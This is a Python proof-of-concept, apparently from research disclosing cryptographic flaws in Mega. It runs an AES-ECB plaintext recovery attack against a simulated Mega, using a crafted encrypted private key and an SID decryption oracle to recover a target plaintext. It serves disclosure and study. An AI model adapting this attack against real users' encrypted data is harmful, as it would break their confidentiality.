
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the AES-ECB plaintext recovery attack on the simulated
# operations of Mega.
#

from secrets import randbelow, token_bytes

from shared.attack_utils import *
from shared.constants.mega_crypto import *
from shared.mega_simulation import *
from issue_02.aes_ecb_pt_recovery_attack import MegaAesEcbPlaintextRecoveryAttack


class PoCAbstractAesEcbPlaintextRecovery:
    def __init__(self):
        print("# Initialize abstract RSA key recovery PoC")
        print(f"## Generate fresh RSA-{RSA_MODULUS_BIT_SIZE} keys")
        self.sk, self.pk = gen_rsa_keys(RSA_MODULUS_BIT_SIZE)
        self.sk_encoded = decode_rsa_privk(self.sk)

        print(f"## Generate fresh master key")
        self.kM = token_bytes(MASTER_KEY_BYTE_LEN)

        self.csk = encrypt_rsa_sk(self.sk_encoded, self.kM)

    def _partial_decryption_oracle(self, c, csk, km):
        c, _ = len_decode(c)
        sk = decrypt_rsa_sk(csk, km)
        return rsa_decrypt(c, sk)[:SID_LEN]

    def run_sanity_checks(self):
        print("## Run sanity checks")
        # Enc/dec
        m = token_bytes(64)
        assert rsa_decrypt(rsa_encrypt(m, self.pk), self.sk_encoded)[:len(m)] == m
        print("### RSA enc/dec correctness: success")

        # Private key encryption and decryption
        assert decrypt_rsa_sk(self.csk, self.kM) == self.sk_encoded
        print("### Private key decryption: success")

    def recover_aes_ecb_plaintext_block(self, oracle, pk, sk, csk, ct):
        """
        Decrypt the ciphertext ct using the SID oracle and knowledge of the public
        and private key.

        :params oracle: Oracle taking an encrypted SID and a private key encrypted
            with AES-ECB under the master key and returns the decrypted SID
        :params pk: RSA public key
        :params sk: RSA secret key
        :params csk: Secret key sk encrypted with AES-ECB under the master key
        :params ct: Ciphertext to decrypt

        :returns: Decryption of ct
        """

        attack = MegaAesEcbPlaintextRecoveryAttack(pk, sk)

        csid = attack.get_special_sid()
        csk_p = attack.get_bogus_csk(csk, ct)
        sid_p = oracle(csid, csk_p)
        pt = attack.recover_pt(sid_p)
        return pt

    def run_attack(self):
        print("## Starting abstract attack")
        oracle = lambda c, csk, km=self.kM: self._partial_decryption_oracle(c, csk, km)

        # Target message and encryption
        pt = token_bytes(32)
        ct = aes_encrypt(pt, self.kM)
        print(f"### Generated target plaintext: {pt.hex()}")

        pt_p = self.recover_aes_ecb_plaintext_block(oracle, self.pk, self.sk, self.csk, ct)
        print(f"### Recovered plaintext: {pt_p.hex()}")

        # Verify attack success
        assert pt == pt_p
        print("### Attack: successful!")
